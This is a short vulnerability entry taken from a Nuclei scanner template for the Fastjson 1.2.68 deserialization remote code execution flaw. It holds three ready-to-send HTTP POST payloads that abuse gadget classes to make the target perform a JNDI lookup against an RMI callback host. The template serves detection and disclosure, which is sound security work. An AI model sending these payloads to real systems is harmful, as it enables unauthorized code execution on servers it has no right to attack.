# Vulnerability: Fastjson 1.2.68 - Remote Code Execution
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`fastjson-1-2-68-rce.yaml`)

## Description
Fastjson 1.2.68 is susceptible to a deserialization remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
   "@type":"org.apache.shiro.jndi.JndiObjectFactory",
   "resourceName":"rmi://{{interactsh-url}}/Exploit"
}

POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
   "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
   "jndiNames":"rmi://{{interactsh-url}}/Exploit"
}

POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
   "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
   "metricRegistry":"rmi://{{interactsh-url}}/Exploit"
}
```

